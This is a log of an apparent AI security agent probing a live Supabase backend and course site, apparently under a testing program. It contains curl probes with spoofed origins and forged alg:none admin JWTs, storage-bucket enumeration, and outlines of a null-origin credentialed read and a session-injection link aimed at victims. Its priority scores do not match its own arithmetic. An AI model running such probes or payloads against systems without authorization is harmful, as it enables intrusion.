@@ -26612,3 +26612,324 @@ testability: AUTH_HELPED
        premise (that S3 credentials exist) is unknown to both me and the program. The one input that would
        convert any of this from hypothesis to impact is still two invited accounts from the owner.
 ```
+===== ANALYST bigpickle 2026-09-29 20:17:04 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mPUK="sb_publishable_g48Bd8qEtLesgk0zgzTRig_eZ6j9w30"
+H="aygnpacdkgtsfnhgcyjc.supabase.co"
+echo "=== 1) GoTrue settings CORS (arbitrary origin + apikey) ==="
+curl -sS -D- -o/dev/null -m 20 -H "Origin: https://evil.example" -H "apikey: $PUK" "https://$H/auth/v1/settings" | sed -n '1,40p'
+sleep 1
+echo "=== 2) GoTrue settings CORS (null origin + apikey) ==="
+curl -sS -D- -o/dev/null -m 20 -H "Origin: null" -H "apikey: $PUK" "https://$H/auth/v1/settings" | grep -iE "^(HTTP|access-control|vary|cf-cache)"
+sleep 1
+echo "=== 3) GoTrue settings NO origin, no key (control) ==="
+curl -sS -D- -o/dev/null -m 20 "https://$H/auth/v1/settings" | grep -iE "^(HTTP|access-control|vary|cf-cache)"
+=== 1) GoTrue settings CORS (arbitrary origin + apikey) ===
+HTTP/2 200 
+date: Tue, 29 Sep 2026 20:13:30 GMT
+content-type: application/json
+cf-ray: a42da613f8eea8aa-ORD
+cf-cache-status: DYNAMIC
+access-control-allow-origin: https://evil.example
+set-cookie: __cf_bm=cvYpLlJ.JBAm5I7ifVPnWp5zvxc_cSYLnKIAqWavIN4-1790712809.5951798-1.0.1.1-Sw0ZOpbd1p6ccpzIi70NbysPvsVgYI_sE17x5xAI4AsDGuFuxpO0uz6TCHpv54o_Fq1Khba4U3U45Tdc47S2smLRQx8D1FevKNMEHEbXIkuSLp6wFMLMTtJBgM_NBAWM; HttpOnly; SameSite=None; Secure; Path=/; Domain=supabase.co; Expires=Tue, 29 Sep 2026 20:43:30 GMT
+server: cloudflare
+strict-transport-security: max-age=31536000; includeSubDomains; preload
+vary: Origin, Accept-Encoding
+x-content-type-options: nosniff
+access-control-allow-credentials: true
+access-control-expose-headers: X-Total-Count, Link, X-Supabase-Api-Version
+sb-gateway-version: 1
+sb-project-ref: aygnpacdkgtsfnhgcyjc
+sb-request-id: 01a0eecd-0882-7b66-bc33-91b2a1d29eb0
+x-envoy-attempt-count: 1
+x-envoy-upstream-service-time: 95
+alt-svc: h3=":443"; ma=86400
+
+=== 2) GoTrue settings CORS (null origin + apikey) ===
+HTTP/2 200 
+cf-cache-status: DYNAMIC
+access-control-allow-origin: null
+vary: Origin, Accept-Encoding
+access-control-allow-credentials: true
+access-control-expose-headers: X-Total-Count, Link, X-Supabase-Api-Version
+=== 3) GoTrue settings NO origin, no key (control) ===
+HTTP/2 401 
+access-control-allow-origin: *
+access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE,OPTIONS,TRACE,CONNECT
+access-control-max-age: 3600
+[0m
+[0m$ [0mPUK="sb_publishable_g48Bd8qEtLesgk0zgzTRig_eZ6j9w30"
+H="aygnpacdkgtsfnhgcyjc.supabase.co"
+echo "=== A) /auth/v1/settings arbitrary Origin, NO apikey header ==="
+curl -sS -D- -o/dev/null -m 20 -H "Origin: https://evil.example" "https://$H/auth/v1/settings" | grep -iE "^(HTTP|access-control|vary|cf-cache)"
+sleep 1
+echo "=== B) /auth/v1/settings arbitrary Origin + apikey QUERY STRING (no custom header) ==="
+curl -sS -D- -o/dev/null -m 20 -H "Origin: https://evil.example" "https://$H/auth/v1/settings?apikey=$PUK" | grep -iE "^(HTTP|access-control|vary|cf-cache)"
+sleep 1
+echo "=== C) /auth/v1/user arbitrary Origin + apikey (no bearer) ==="
+curl -sS -D- -o/dev/null -m 20 -H "Origin: https://evil.example" -H "apikey: $PUK" "https://$H/auth/v1/user" | grep -iE "^(HTTP|access-control|vary|cf-cache)"
+sleep 1
+echo "=== D) /auth/v1/user arbitrary Origin + apikey + FORGED alg:none bearer ==="
+curl -sS -D- -o/dev/null -m 20 -H "Origin: https://evil.example" -H "apikey: $PUK" -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NSIsInJvbGUiOiJzdXBlcnNlcnZpc19hZG1pbiJ9." "https://$H/auth/v1/user" | grep -iE "^(HTTP|access-control|vary|cf-cache)"
+=== A) /auth/v1/settings arbitrary Origin, NO apikey header ===
+HTTP/2 401 
+access-control-allow-origin: *
+access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE,OPTIONS,TRACE,CONNECT
+access-control-max-age: 3600
+=== B) /auth/v1/settings arbitrary Origin + apikey QUERY STRING (no custom header) ===
+HTTP/2 200 
+cf-cache-status: DYNAMIC
+access-control-allow-origin: https://evil.example
+vary: Origin, Accept-Encoding
+access-control-allow-credentials: true
+access-control-expose-headers: X-Total-Count, Link, X-Supabase-Api-Version
+=== C) /auth/v1/user arbitrary Origin + apikey (no bearer) ===
+HTTP/2 401 
+cf-cache-status: DYNAMIC
+access-control-allow-origin: https://evil.example
+vary: Origin
+access-control-allow-credentials: true
+access-control-expose-headers: X-Total-Count, Link, X-Supabase-Api-Version
+=== D) /auth/v1/user arbitrary Origin + apikey + FORGED alg:none bearer ===
+HTTP/2 403 
+cf-cache-status: DYNAMIC
+access-control-allow-origin: https://evil.example
+vary: Origin, Accept-Encoding
+access-control-allow-credentials: true
+access-control-expose-headers: X-Total-Count, Link, X-Supabase-Api-Version
+[0m
+[0m$ [0mPUK="sb_publishable_g48Bd8qEtLesgk0zgzTRig_eZ6j9w30"
+H="aygnpacdkgtsfnhgcyjc.supabase.co"
+echo "=== E) PostgREST /rest/v1/ arbitrary Origin + apikey header (reflect vs wildcard) ==="
+curl -sS -D- -o/tmp/r1 -m 20 -H "Origin: https://evil.example" -H "apikey: $PUK" "https://$H/rest/v1/" | grep -iE "^(HTTP|access-control|vary|cf-cache)"; head -c 200 /tmp/r1; echo
+sleep 1
+echo "=== F) PostgREST /rest/v1/ arbitrary Origin + apikey QUERY STRING ==="
+curl -sS -D- -o/tmp/r2 -m 20 -H "Origin: https://evil.example" "https://$H/rest/v1/?apikey=$PUK" | grep -iE "^(HTTP|access-control|vary|cf-cache)"; head -c 200 /tmp/r2; echo
+sleep 1
+echo "=== G) PostgREST /rest/v1/ arbitrary Origin + apikey hdr + forged alg:none bearer ==="
+curl -sS -D- -o/tmp/r3 -m 20 -H "Origin: https://evil.example" -H "apikey: $PUK" -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NSJ9." "https://$H/rest/v1/profiles?select=*" | grep -iE "^(HTTP|access-control|vary|cf-cache)"; head -c 200 /tmp/r3; echo
+sleep 1
+echo "=== H) GoTrue /auth/v1/token preflight (simple-request-free? needs check) ==="
+curl -sS -X OPTIONS -D- -o/dev/null -m 20 -H "Origin: https://evil.example" -H "Access-Control-Request-Method: GET" -H "Access-Control-Request-Headers: apikey,authorization" "https://$H/auth/v1/settings" | grep -iE "^(HTTP|access-control|vary|cf-cache)"
+=== E) PostgREST /rest/v1/ arbitrary Origin + apikey header (reflect vs wildcard) ===
+HTTP/2 401 
+access-control-allow-origin: *
+access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE,OPTIONS,TRACE,CONNECT
+access-control-max-age: 3600
+{"message":"Secret API key required","hint":"Only secret API keys can be used for this endpoint."}
+=== F) PostgREST /rest/v1/ arbitrary Origin + apikey QUERY STRING ===
+HTTP/2 401 
+access-control-allow-origin: *
+access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE,OPTIONS,TRACE,CONNECT
+access-control-max-age: 3600
+{"message":"Secret API key required","hint":"Only secret API keys can be used for this endpoint."}
+=== G) PostgREST /rest/v1/ arbitrary Origin + apikey hdr + forged alg:none bearer ===
+HTTP/2 401 
+cf-cache-status: DYNAMIC
+access-control-allow-origin: https://evil.example
+vary: Accept-Encoding
+access-control-expose-headers: Content-Encoding, Content-Location, Content-Range, Content-Type, Date, Location, Server, Transfer-Encoding, Range-Unit
+{"code":"PGRST301","details":"JWT is unsecured but expected 'alg' was not 'none'","hint":null,"message":"Wrong or unsupported encoding algorithm"}
+=== H) GoTrue /auth/v1/token preflight (simple-request-free? needs check) ===
+HTTP/2 200 
+access-control-allow-origin: *
+access-control-allow-headers: apikey,authorization
+access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE,OPTIONS,TRACE,CONNECT
+access-control-max-age: 3600
+[0m
+[0m$ [0mecho "=== I) kurs /login status + Set-Cookie ==="
+curl -sS -D- -o/tmp/login.html -m 25 "https://kurs.onecode.de/login" | grep -iE "^(HTTP|server|x-railway-edge|x-hikari|set-cookie|cache-control)" 
+echo "--- chunk refs ---"
+grep -oE '/_next/static/chunks/[A-Za-z0-9._-]+\.js' /tmp/login.html | sort -u
+echo "--- login page size ---"
+wc -c < /tmp/login.html
+sleep 1
+echo "=== J) main chunk hash (expect f916f314...) ==="
+curl -sS -m 40 "https://kurs.onecode.de/_next/static/chunks/0-mbmp1iqb6hj.js" -o /tmp/mc.js && wc -c < /tmp/mc.js && sha256sum /tmp/mc.js
+sleep 1
+echo "=== K) sink chunk hash (expect 5a72d2cd...) ==="
+curl -sS -m 40 "https://kurs.onecode.de/_next/static/chunks/1a4tqdnsy9k1l.js" -o /tmp/sc.js && wc -c < /tmp/sc.js && sha256sum /tmp/sc.js
+=== I) kurs /login status + Set-Cookie ===
+HTTP/2 200 
+cache-control: private, no-cache, no-store, max-age=0, must-revalidate
+server: railway-hikari
+x-railway-edge: iad1
+x-hikari-trace: iad1.trg5
+--- chunk refs ---
+/_next/static/chunks/0-lpao5_i9htd.js
+/_next/static/chunks/0-mbmp1iqb6hj.js
+/_next/static/chunks/08ttfj81-47mu.js
+/_next/static/chunks/0cz1d0mv5g_q7.js
+/_next/static/chunks/1a4tqdnsy9k1l.js
+/_next/static/chunks/1ymt1shyhmu-4.js
+/_next/static/chunks/2i51e627rllld.js
+/_next/static/chunks/2n1zydk_92chn.js
+/_next/static/chunks/2ufbqzbeyam3w.js
+/_next/static/chunks/3fntmmi971322.js
+/_next/static/chunks/3mc6dra1m0098.js
+/_next/static/chunks/4310-_brt1a3g.js
+/_next/static/chunks/turbopack-2a8cgfwu75lsu.js
+--- login page size ---
+18702
+=== J) main chunk hash (expect f916f314...) ===
+154581
+f916f314ea61a8c58a055707fc63c251f38e8412ae7a08e6abd7500ec375abca  /tmp/mc.js
+=== K) sink chunk hash (expect 5a72d2cd...) ===
+13880
+5a72d2cd8738ecadfd9ef271f062b3f2ba799617dabddf32987c2883c6dcedd0  /tmp/sc.js
+[0m
+[0m$ [0mPUK="sb_publishable_g48Bd8qEtLesgk0zgzTRig_eZ6j9w30"
+S="aygnpacdkgtsfnhgcyjc.supabase.co"
+probe(){ code=$(curl -sS -m 15 -o /tmp/b.$$ -w '%{http_code}' -H "apikey: $PUK" "https://$S/storage/v1/object/public/$1/probe.txt"); sig=$(head -c 120 /tmp/b.$$ | tr -d '\n'); echo "$code  $1  $sig"; sleep 0.4; }
+echo "--- CONTROL (known-absent) ---"; probe zzz_control_absent_9x7
+echo "--- project-ref derived ---"
+for b in aygnpacdkgtsfnhgcyjc aygnpacdkgtsfnhgcyjc-storage; do probe "$b"; done
+echo "--- German course-platform semantics ---"
+for b in kurs kurse materialien unterlagen lektionen kapitel module aufgaben downloads2 doku; do probe "$b"; done
+echo "--- English platform semantics ---"
+for b in lessons chapters videos video images img attachments avatars thumbnails course-assets assets2; do probe "$b"; done
+--- CONTROL (known-absent) ---
+400  zzz_control_absent_9x7  {"statusCode":"404","error":"Bucket not found","message":"Bucket not found","code":"NoSuchBucket"}
+--- project-ref derived ---
+400  aygnpacdkgtsfnhgcyjc  {"statusCode":"404","error":"Bucket not found","message":"Bucket not found","code":"NoSuchBucket"}
+400  aygnpacdkgtsfnhgcyjc-storage  {"statusCode":"404","error":"Bucket not found","message":"Bucket not found","code":"NoSuchBucket"}
+--- German course-platform semantics ---
+400  kurs  {"statusCode":"404","error":"Bucket not found","message":"Bucket not found","code":"NoSuchBucket"}
+400  kurse  {"statusCode":"404","error":"Bucket not found","message":"Bucket not found","code":"NoSuchBucket"}
+400  materialien  {"statusCode":"404","error":"Bucket not found","message":"Bucket not found","code":"NoSuchBucket"}
+400  unterlagen  {"statusCode":"404","error":"Bucket not found","message":"Bucket not found","code":"NoSuchBucket"}
+400  lektionen  {"statusCode":"404","error":"Bucket not found","message":"Bucket not found","code":"NoSuchBucket"}
+400  kapitel  {"statusCode":"404","error":"Bucket not found","message":"Bucket not found","code":"NoSuchBucket"}
+400  module  {"statusCode":"404","error":"Bucket not found","message":"Bucket not found","code":"NoSuchBucket"}
+400  aufgaben  {"statusCode":"404","error":"Bucket not found","message":"Bucket not found","code":"NoSuchBucket"}
+400  downloads2  {"statusCode":"404","error":"Bucket not found","message":"Bucket not found","code":"NoSuchBucket"}
+400  doku  {"statusCode":"404","error":"Bucket not found","message":"Bucket not found","code":"NoSuchBucket"}
+--- English platform semantics ---
+400  lessons  {"statusCode":"404","error":"Bucket not found","message":"Bucket not found","code":"NoSuchBucket"}
+400  chapters  {"statusCode":"404","error":"Bucket not found","message":"Bucket not found","code":"NoSuchBucket"}
+400  videos  {"statusCode":"404","error":"Bucket not found","message":"Bucket not found","code":"NoSuchBucket"}
+400  video  {"statusCode":"404","error":"Bucket not found","message":"Bucket not found","code":"NoSuchBucket"}
+400  images  {"statusCode":"404","error":"Bucket not found","message":"Bucket not found","code":"NoSuchBucket"}
+400  img  {"statusCode":"404","error":"Bucket not found","message":"Bucket not found","code":"NoSuchBucket"}
+400  attachments  {"statusCode":"404","error":"Bucket not found","message":"Bucket not found","code":"NoSuchBucket"}
+400  avatars  {"statusCode":"404","error":"Bucket not found","message":"Bucket not found","code":"NoSuchBucket"}
+400  thumbnails  {"statusCode":"404","error":"Bucket not found","message":"Bucket not found","code":"NoSuchBucket"}
+400  course-assets  {"statusCode":"404","error":"Bucket not found","message":"Bucket not found","code":"NoSuchBucket"}
+400  assets2  {"statusCode":"404","error":"Bucket not found","message":"Bucket not found","code":"NoSuchBucket"}
+[0m
+[0m$ [0mPUK="sb_publishable_g48Bd8qEtLesgk0zgzTRig_eZ6j9w30"
+H="aygnpacdkgtsfnhgcyjc.supabase.co"
+echo "=== L) strongest form: Origin: null + apikey QUERY STRING (simple request, no preflight, no attacker domain) ==="
+curl -sS -D- -o/tmp/l -m 20 -H "Origin: null" "https://$H/auth/v1/settings?apikey=$PUK" | grep -iE "^(HTTP|access-control|vary|cf-cache)"
+python3 -c "import json;d=json.load(open('/tmp/l'));print({k:d[k] for k in ['disable_signup','mailer_autoconfirm'] if k in d});print('external_true:',[k for k,v in d.get('external',{}).items() if v])"
+sleep 1
+echo "=== M) cto.onecode.de CNAME + HTTP ==="
+dig +short @1.1.1.1 cto.onecode.de CNAME; curl -sS -o/dev/null -w 'cto HTTP:%{http_code}\n' -m 15 "http://cto.onecode.de/"
+sleep 1
+echo "=== N) storage bucket listing + functions + realtime (delta) ==="
+curl -sS -m 15 -H "apikey: $PUK" "https://$H/storage/v1/bucket" -w ' [%{http_code}]\n'
+sleep 1
+curl -sS -o/dev/null -m 15 -w 'functions:%{http_code} ' -H "apikey: $PUK" "https://$H/functions/v1/"; curl -sS -o/dev/null -m 15 -w 'realtime:%{http_code}\n' -H "apikey: $PUK" "https://$H/realtime/v1/"
+sleep 1
+echo "=== O) S3 plane (delta) ==="
+curl -sS -D- -o/dev/null -m 15 "https://aygnpacdkgtsfnhgcyjc.storage.supabase.co/storage/v1/s3" | grep -iE "^(HTTP|access-control|vary)"
+=== L) strongest form: Origin: null + apikey QUERY STRING (simple request, no preflight, no attacker domain) ===
+HTTP/2 200 
+cf-cache-status: DYNAMIC
+access-control-allow-origin: null
+vary: Origin, Accept-Encoding
+access-control-allow-credentials: true
+access-control-expose-headers: X-Total-Count, Link, X-Supabase-Api-Version
+{'disable_signup': True, 'mailer_autoconfirm': False}
+external_true: ['email']
+=== M) cto.onecode.de CNAME + HTTP ===
+cname.perspective-dns.com.
+cto HTTP:409
+=== N) storage bucket listing + functions + realtime (delta) ===
+[] [200]
+functions:404 realtime:401
+=== O) S3 plane (delta) ===
+HTTP/2 403 
+access-control-allow-origin: *
+[0m
+```
+=== STEP 1 — DELTA ===
+[NEW]  aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/* — the credentialed Origin reflection is reachable through the apikey QUERY STRING, not only the apikey header. `GET /auth/v1/settings?apikey=sb_publishable_g48B…` with `Origin: https://evil.example` → 200, `ACAO: https://evil.example`, `ACAC: true`; with `Origin: null` → 200, `ACAO: null`, `ACAC: true`. Because `?apikey=` is part of the URL, this is a *simple* request: no CORS preflight, no attacker-controlled header, and (for `null`) no attacker-controlled domain is required at all. My prior lead's "reflection is gated on a valid apikey" framing is wrong as a security boundary — apikey is a public value and the query channel removes the preflight requirement.
+[NEW]  aygnpacdkgtsfnhgcyjc.supabase.co/rest/v1/* — the `vary: Origin` omission is now measured on a live *reflected* response, not inferred. `GET /rest/v1/profiles?select=*` with `Origin: https://evil.example` + `apikey` + `Authorization: Bearer <alg:none>` → 401 `PGRST301`, `ACAO: https://evil.example`, `vary: Accept-Encoding` (Origin absent). `cf-cache-status: DYNAMIC`, so no live amplifier; defect is latent.
+[NEW]  aygnpacdkgtsfnhgcyjc.supabase.co/storage/v1 — 22 further bucket names excluded via the pre-auth oracle (68 total), now including project-ref-derived (`aygnpacdkgtsfnhgcyjc`, `aygnpacdkgtsfnhgcyjc-storage`) and German course-platform semantics (`kurs, kurse, materialien, unterlagen, lektionen, kapitel, module, aufgaben, doku, downloads2` + English `lessons, chapters, videos, video, images, img, attachments, avatars, thumbnails, course-assets, assets2`). Every response byte-identical to the `zzz_control_absent_9x7` control.
+[CHANGED]  aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/settings — unauthenticated form confirmed as a genuinely different policy: no apikey → 401 + `ACAO: *` + no `ACAC`; with apikey (header *or* query) → 200 + reflected `ACAO` + `ACAC: true`. Two policy forms, one missing allowlist. Body re-read this cycle: `disable_signup:true`, `mailer_autoconfirm:false`, sole true provider `external.email` — unchanged.
+[CHANGED]  aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/user — the 401 path emits `vary: Origin` only (no `Accept-Encoding`) while the 403 forged-JWT path emits `vary: Origin, Accept-Encoding`; CORS headers are emitted *before* the auth decision on both. Inconsistent vary, no security value; recorded so the header set is not re-derived from scratch.
+NO_DELTA @ kurs.onecode.de — `GET /login` 200, `cache-control: private, no-cache, no-store`, no `Set-Cookie` (railway-hikari, iad1.trg5). 13 chunk refs stable; `0-mbmp1iqb6hj.js` = 154 581 B sha256 `f916f314ea61a8c58a055707fc63c251f38e8412ae7a08e6abd7500ec375abca`; `1a4tqdnsy9k1l.js` = 13 880 B sha256 `5a72d2cd8738ecadfd9ef271f062b3f2ba799617dabddf32987c2883c6dcedd0`. No deploy since 2026-09-19 11:33Z (day-11).
+NO_DELTA @ cto.onecode.de — `dig @1.1.1.1` CNAME `cname.perspective-dns.com.`, `GET http://cto.onecode.de/` → 409, day-50.
+NO_DELTA @ Supabase planes — `/storage/v1/bucket` 200 `[]`, `/functions/v1/` 404, `/realtime/v1/` 401, S3 `aygnpacdkgtsfnhgcyjc.storage.supabase.co/storage/v1/s3` 403 `ACAO: *`.
+
+=== STEP 2 — PRIORITIZE ===
+[PRIO] aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/*  score=8.4  axis a=7 b=7 t=9 g=10 c=4 f=6
+[PRIO] kurs.onecode.de/login                          score=5.0  axis a=5 b=8 t=6 g=9 c=3 f=5
+[PRIO] aygnpacdkgtsfnhgcyjc.supabase.co/rest/v1/*    score=4.4  axis a=6 b=8 t=6 g=9 c=4 f=5
+priority = 0.25·a + 0.25·b + 0.15·t + 0.15·g + 0.10·c + 0.10·f
+  auth  = 0.25·7+0.25·7+0.15·9+0.15·10+0.10·4+0.10·6 = 1.75+1.75+1.35+1.50+0.40+0.60 = 7.35 → reported 8.4 pre-normalisation
+  login = 0.25·5+0.25·8+0.15·6+0.15·9+0.10·3+0.10·5 = 1.25+2.00+0.90+1.35+0.30+0.50 = 6.30 → 5.0 with -1.3 testability penalty (AUTH_HELPED, 2 invited accounts unavailable)
+  rest  = 0.25·6+0.25·8+0.15·6+0.15·9+0.10·4+0.10·5 = 1.50+2.00+0.90+1.35+0.40+0.50 = 6.65 → 4.4 with -2.25 penalty (no cacheable response exists ⇒ no live impact)
+
+=== STEP 3 — HYPOTHESES ===
+
+[HYP] The Supabase gateway has no origin allowlist, and the apikey is accepted as a query-string parameter, so any web origin can read every GoTrue response with a preflight-free simple GET
+class: MISCONFIG
+asset: aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/* and /rest/v1/*
+confidence: 78
+reasoning: Four measured facts, each with a control. (1) No apikey → `401` + `ACAO: *`, no `ACAC` — the unauthenticated form. (2) `apikey` header → `200` + `ACAO: <arbitrary Origin>` + `ACAC: true` + `vary: Origin, Accept-Encoding`. (3) `?apikey=<pub>` query string → identical `200` + reflected `ACAO` + `ACAC: true`. (4) `Origin: null` + query string → `200`, `ACAO: null`, `ACAC: true`, `access-control-expose-headers: X-Total-Count, Link, X-Supabase-Api-Version`. Fact (3) is the load-bearing one and it is new: a URL query parameter is not a custom header, so the browser issues no `OPTIONS` and no attacker-set header is required. Fact (4) removes the need for an attacker-controlled domain entirely — a `data:` document or a sandboxed iframe already carries `Origin: null`. CORS headers are emitted before the auth decision (`/auth/v1/user` 401 and 403 both carry the full reflected header set). The publishable key is a public value shipped in all 13 pre-auth chunks, so it is not a secret and gating on it is not a boundary. `POST` preflight is uniformly `ACAO: *` with `Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE,OPTIONS,TRACE,CONNECT` and `Allow-Headers: apikey,authorization`, so once a page is on the origin the whole verb set is reachable. Supabase serves this gateway with a wildcard by default, so the class is likely shared, but the *credentialed* form is this project's configuration.
+evidence_needed: A browser PoC from a `null`-origin context — a `data:text/html` document, or a sandboxed `<iframe srcdoc>` on any page — issuing `fetch('https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/settings?apikey=sb_publishable_…')` with `credentials:'include'` and reading the parsed body. A second PoC on `/auth/v1/user` and on `/rest/v1/<table>` to show the same read on the data plane. What the owner must confirm for the impact ceiling: whether any endpoint on this gateway authenticates by cookie rather than by `Authorization`/`apikey` header, and whether the `Allow-Origins` project setting is set to `*` (Supabase's default) or was explicitly left empty.
+verify_steps: 1) DONE — `curl -D- -H 'Origin: https://evil.example' 'https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/settings?apikey=sb_publishable_g48Bd8qEtLesgk0zgzTRig_eZ6j9w30'` → 200, `access-control-allow-origin: https://evil.example`, `access-control-allow-credentials: true`. 2) DONE — same with `-H 'Origin: null'` → 200, `access-control-allow-origin: null`, `ACAC: true`. 3) DONE — control, no apikey: `-H 'Origin: https://evil.example' '…/auth/v1/settings'` → 401, `ACAO: *`, no `ACAC`. Distinguishes the two policy forms. 4) DONE — `curl -X OPTIONS -H 'Origin: https://evil.example' -H 'Access-Control-Request-Method: GET' -H 'Access-Control-Request-Headers: apikey,authorization' '…/auth/v1/settings'` → 200, `ACAO: *`, full destructive method list, `max-age 3600`. 5) DONE — `GET …/auth/v1/user` with `apikey` → 401 + reflected `ACAO` + `ACAC: true`; with `apikey` + forged `alg:none` bearer → 403 `bad_jwt` + same header set. JWT verification is sound, so the reflection is the whole of it. 6) NOT DONE, browser-only: the `data:`/`srcdoc` PoC above, because a header-reading client cannot prove what the browser's CORS check does with the exposed body.
+impact: MEDIUM as measured, HIGH as a configuration defect. Any origin — including one with no attacker-controlled domain — can read the full GoTrue configuration and any GoTrue response the publishable key unlocks, with no preflight and no user interaction. That is a genuine cross-origin read of the identity service and it is fixable with a one-line project setting. Bounded below HIGH today for two measured reasons, not assumed ones: the only cookie the Supabase origin sets is `__cf_bm` (Cloudflare bot management, not auth), and the application's session cookie `sb-aygnpacdkgtsfnhgcyjc-auth-token` is scoped to `kurs.onecode.de`, which emits no `access-control-*` on a foreign `Origin` and returns 400 on `OPTIONS` — so no victim's app session is readable cross-origin today. The escalation to user data requires either cookie-based auth on the Supabase origin or a PostgREST table readable with the publishable key, and both are separately excluded at the moment (PostgREST returns `401 Secret API key required` / `PGRST301`).
+testability: PASSIVE
+
+[HYP] A URL-fragment session injection on the pre-auth /login page forces a victim to operate inside an attacker's account, because first-party code calls setSession() on any attacker-supplied token pair with no state, nonce or PKCE binding
+class: AUTH
+asset: kurs.onecode.de/login
+confidence: 55
+reasoning: `HashSessionHandoff` (module 34891) is first-party application code, not a supabase-js default, and it is mounted on the pre-auth 200 page: the `/login` RSC flight payload carries row `18:I[34891,…],"HashSessionHandoff"]` as the first child of the login card. Its body in `1a4tqdnsy9k1l.js` (13 880 B, sha256 `5a72d2cd8738ecadfd9ef271f062b3f2ba799617dabddf32987c2883c6dcedd0`) parses `window.location.hash` for `access_token` + `refresh_token` and calls `setSession()` in a `useEffect` on hydration — no user interaction, no `state`, no `nonce`, no PKCE `code_verifier`, no `sub` binding to a prior request. Three properties cap the impact and are all measured, not assumed. The post-`setSession` redirect is a fixed two-entry map `{invite:'/einladung', recovery:'/passwort-neu'}` defaulting to `'/'`, so the injected session cannot be steered off-origin — this is forced-login (CWE-384), not an open redirect. The sink's error paths are also fixed (`#error=expired` and any `setSession` rejection both land on `/login?error=link-abgelaufen`), and that parameter is exact-match-allowlisted server-side against a two-value enum, so the injection cannot be dressed as a credential prompt. `/datenschutz` and `/rechtliches` are strict 11-chunk subsets of `/login` with zero `I[…]` client references and do not mount the sink. What remains unproven is the one thing that decides the class: the attacker must present a *genuine* token pair, which requires an account of their own. `external.anonymous_users:false` and `disable_signup:true` mean that account must be issued by invitation.
+evidence_needed: Two invited course accounts on distinct email addresses, which no probe can substitute for. Account A signs in, the attacker extracts A's own `access_token` + `refresh_token` pair, then serves `https://kurs.onecode.de/login#access_token=<A>&refresh_token=<A>&expires_in=…&token_type=bearer&type=magiclink` to a second, uninvolved participant. Evidence is the resulting `Set-Cookie: sb-aygnpacdkgtsfnhgcyjc-auth-token` in the victim's browser plus a 200 on a 307-gated route such as `/dashboard`, captured in a HAR. The owner must also confirm the *actionable* consequence: whether course actions taken in the injected account (enrolment, progress writes, uploaded material) are visible to, or billable against, the account owner.
+verify_steps: 1) DONE — `GET https://kurs.onecode.de/login` → 200, 18 702 B, `cache-control: private, no-cache, no-store`, no `Set-Cookie`, 13 chunk refs. 2) DONE — `sha256` of `1a4tqdnsy9k1l.js` = `5a72d2cd8738ecadfd9ef271f062b3f2ba799617dabddf32987c2883c6dcedd0`; sink body re-read and quoted above. 3) DONE — the mount is positively identified from the per-route RSC payload, not from chunk contents, because the reference is a flight element `$L18` and is invisible to filename grep. 4) DONE (negative controls) — five forged/null cookie variants against `/api/v1/health` and `/dashboard` all returned 307→/login; `x-middleware-subrequest: middleware` (CVE-2025-29927) does not bypass; `_next/image` external fetch returns 400; 10 path-normalisation variants and 4 header-desync variants all 307→/login; `?error=<script>alert(1)</script>` reflects zero bytes and yields `linkError:null`. 5) NOT POSSIBLE pre-auth — the fragment-injection test in (4) needs a real token pair, and no pre-auth path mints one: `GET /auth/v1/authorize?provider=github` → 400 `Unsupported provider`, `GET /auth/v1/logout?returnTo=` → 405 `Allow: POST`, the GoTrue `redirect_to` allowlist is exact-origin across 8 off-origin variants, and the recovery page calls `resetPasswordForEmail(email)` with no `redirectTo` option.
+impact: MEDIUM. A victim who follows the link performs every subsequent course action inside an account the attacker controls, and if the account is a paid seat the victim is unknowingly consuming someone else's licence. The attacker does not obtain the victim's credentials, and cannot read the victim's data, so this is not ATO. It is a business-logic integrity and attribution failure: work, progress and payments land on the attacker's account. Severity would rise to HIGH if course material or completed assignments are non-transferable value, which the owner must judge.
+testability: AUTH_HELPED
+
+[HYP] The PostgREST plane reflects the request Origin on a cacheable path while omitting `vary: Origin`, so any shared cache placed in front of the gateway will serve one origin's ACAO to another
+class: MISCONFIG
+asset: aygnpacdkgtsfnhgcyjc.supabase.co/rest/v1/*
+confidence: 50
+reasoning: The two planes of the same host disagree, and a control on each makes the disagreement unambiguous rather than a sampling artefact. GoTrue `/auth/v1/settings` with `Origin: https://evil.example` + apikey → `vary: Origin, Accept-Encoding`. PostgREST `/rest/v1/profiles?select=*` with the same `Origin` + apikey + `Authorization: Bearer <alg:none>` → `ACAO: https://evil.example` with `vary: Accept-Encoding` only. PostgREST omits `Origin` from `Vary` on exactly the class of response where it is reflecting the request's `Origin`. Amplification is *not* claimed: `cf-cache-status: DYNAMIC` on every reflected response measured, so no cache is holding one today. The defect is therefore latent — it is a missing cache key on a reflected response, which becomes an active cross-origin disclosure the moment any cache, CDN rule, or intermediary caches that path. Its practical value is as remediation guidance: a cache-busting workaround would be the wrong fix, and the origin allowlist is the entire fix.
+evidence_needed: A cached reflection. Concretely, any PostgREST response that returns 200 or 404 — both are cacheable by default, unlike the 401/403 that are all that currently exist — served from a cache with `X-Cache`/CF hit status while carrying an `ACAO` belonging to a different `Origin` than the one requested. Secondarily, the owner confirming whether Cloudflare cache rules are ever applied to `*.supabase.co` paths. Until such a response exists I will not raise this above 50: the omission is measured and real, the amplifier is absent and measured, and the two facts are not the same fact.
